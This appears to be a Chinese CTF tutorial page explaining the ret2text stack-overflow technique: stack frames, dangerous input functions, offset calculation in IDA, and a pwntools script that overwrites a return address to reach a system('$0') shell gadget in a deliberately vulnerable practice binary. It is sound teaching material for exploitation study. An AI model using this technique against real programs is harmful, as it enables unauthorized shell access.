---
title: "ret2text"
description: ""
lead: ""
date: 2020-10-06T08:48:57+00:00
lastmod: 2020-10-06T08:48:57+00:00
draft: false
images: []
menu:
  docs:
    parent: "stackoverflow"
weight: 1
toc: true
---

## 0x01 介绍

栈是进程最常用到的内存类型之一，它具有高效和简单的特点，主要用来存储函数调用信息。通常来说32位的程序一个栈单元为4个字节，而64位程序一个栈单元为8个字节，然后多个栈单元可以组成一个 `栈帧` ，栈帧的大小主要看函数信息的多少。一个栈单元通常包括以下几部分：

- 函数的参数，一般有父函数压入栈中
- 函数的返回地址，即函数执行完后ret跳转的地址
- 帧指针，即上一个栈帧的位置
- 局部变量，即函数内部声明的变量

![a5b8d65a6d18aadeec8932e39c376e6e](images/a5b8d65a6d18aadeec8932e39c376e6e.png)  

栈有三大很重要的作用，同时也体现在栈帧结构里面了：

1. 保存函数的局部变量
2. 函数调用时传递参数
3. 保存函数返回后的地址

而我们所有的栈溢出基本都是围绕着三大作用在进行，包括这里的ret2text题型。这种题型比较简单，它主要利用的是第三大功能，即函数返回地址，我们可以来看一个简单的程序的汇编代码

```cpp
void main() {
    int a = 1;
    int b = 2;
}
// gcc -m32 test.c -o test -fno-pic -fno-stack-protector -no-pie
```

生成的汇编代码为

```c
080483db <main>:
 80483db:       55                      push   ebp
 80483dc:       89 e5                   mov    ebp,esp
 80483de:       83 ec 10                sub    esp,0x10
 80483e1:       c7 45 fc 01 00 00 00    mov    DWORD PTR [ebp-0x4],0x1
 80483e8:       c7 45 f8 02 00 00 00    mov    DWORD PTR [ebp-0x8],0x2
 80483ef:       90                      nop
 80483f0:       c9                      leave  
 80483f1:       c3                      ret 
```

主要关注函数序言和函数尾声，在进入main函数之前，已经由父函数将main函数的返回地址给压入栈中，接着通过函数序言将帧指针压入栈中，并将帧指针的地址赋值给ebp，经过函数体后则进入函数尾声，尾声主要依靠 `leave` 指令，该指令相当于 `mov esp, ebp;pop ebp` ，当执行完该指令后当前栈顶就变为了main函数的返回地址，而 `ret` 指令的作用是跳转到当前栈顶存储的地址处继续执行（即修改eip为当前栈顶存储的那个值），这里也就是main函数的返回地址。

![a5821d0d5527947c6adb93598fea8cc2](images/a5821d0d5527947c6adb93598fea8cc2.png)  

而ret2text顾名思义，就是控制 `ret` 指令跳转的地址（即函数返回地址）为程序里现有的 `text` 段代码，以达到RCE的过程。至于如何将函数返回地址给修改就需要设计到核心理念 `溢出` ，超过容器本身大小的操作就叫溢出。对于C语言来说，每个变量的大小都是固定的（堆以外），学过的都知道C语言不允许动态设置数组的大小，只能是固定值，例如 `char a[i]` 就是错误的。这时候C语言里有些函数就会变得非常危险，这些危险函数更像是面对人而言并非对程序，比如 `gets` 函数，它是一个输入函数，可以将你输入的内容存进数组当中，并且只有当人输入 `\n` 回车的时候才会截断输入，这样的截断对人来说是合理的，但是对于数组来说一点都不合理，对于数组来说应该是不大于数组大小的输入都是合理的，当你的输入超过数组大小则应该截断。可以 `gets` 函数并没有这么智能，也就是我们可以对该数组进行溢出的操作。

常见的危险函数有：

- `gets` 函数，遇到 `\n` 截断，不保留 `\n` 字符串后面添加 `\x00`
- `fgets` 函数，遇到 `\n` 截断，保留 `\n` 并添加 `\x00`
- `scanf` 函数 `%s` 格式化字符串输入，遇到 `\x09` 、 `\x0a` 、 `\x0b` 、 `\x0c` 、 `\x0d` 、 `\x20` 截断，不保留截断字符最后添加 `\x00`
- `sscanf` 函数，和 `scanf` 差不多，多了个 `\x00` 截断
- str类函数（ `strcpy` 、 `strcat` 等）遇到 `\x00` 截断，保留 `\x00`
- `read` 函数，无截断字符，不添加字符

我们之前说过如果你在函数内部声明一个变量，那么这个就是一个局部变量，存储在栈中，而局部变量邻近的位置并不是空，而是一些其他数据，这时候如果我们通过危险函数对这个局部变量进行溢出，那么我们将可以修改其他数据的内容，只要这个溢出的字节数够多，那么我们就可以修改函数返回地址。

而现有的 `text` 段代码的话通常会是 `system("/bin/sh")` 、 `system("$0")` 、 `execve("/bin/sh", 0, 0)` 这种直接获取shell进程的函数调用

![b9b59d14a021e54f814be527a8daedf9](images/b9b59d14a021e54f814be527a8daedf9.png)  

以一个简单的程序来讲具体实现

```c
#include<stdio.h>
#include<stdlib.h>
void hint()
{
    system("$0");
}

int main()
{
    char buf[0x10];
    printf("input: ");
    scanf("%s", buf);
    return 0;
}
// gcc ret2text.c -o ret2text -no-pie -fno-stack-protector
```

做ret2text记住三大步骤：

1. 找溢出点
2. 计算局部变量到函数返回地址的偏移量
3. 找getshell代码片段地址

根据危险函数列表很容易就可以找到溢出点，即scanf输入处

![dc59fe24e49ebcf598ae82f3af98d3d4](images/dc59fe24e49ebcf598ae82f3af98d3d4.png)  

其次计算偏移量，用IDA有个便捷的方法来计算偏移量，双击上图中的输入变量即v4，可以看到下图

![7caa7bd5a950c570800aaaea4993d6d0](images/7caa7bd5a950c570800aaaea4993d6d0.png)  

这里 `var_10` 即变量， `s` 即帧指针，而 `r` 则是函数返回地址，左侧的地址是相对偏移地址，右侧是每个数据占据的字节大小，可以很容易计算出变量到函数返回地址之间有16+8=24字节的偏移量

最后找getshell代码片段

![308e34110a919be37fafd2c1cb7ab18d](images/308e34110a919be37fafd2c1cb7ab18d.png)  

你可以直接用hint函数地址，也可以只用从给system函数传递参数处的指令开始，两者结果是一样的

最后我们就可以编写攻击脚本了

```python
from pwn import*    # 引入pwntools包
o = process("./ret2text")    # 执行ret2text程序并获取其I/O接口
payload = b'a'*24    # 填充变量与函数返回地址的空隙
payload += p64(0x4005d6)    # 0x4005d6是getshell代码片段地址，p64的作用是将地址打包成小端序填入栈单元
o.sendline(payload)    # 发送payload，会在结尾加 '\n'
o.interactive()    # 进入交互模式
```

![2092706e1062c14ccbabe46f32ccf796](images/2092706e1062c14ccbabe46f32ccf796.png)
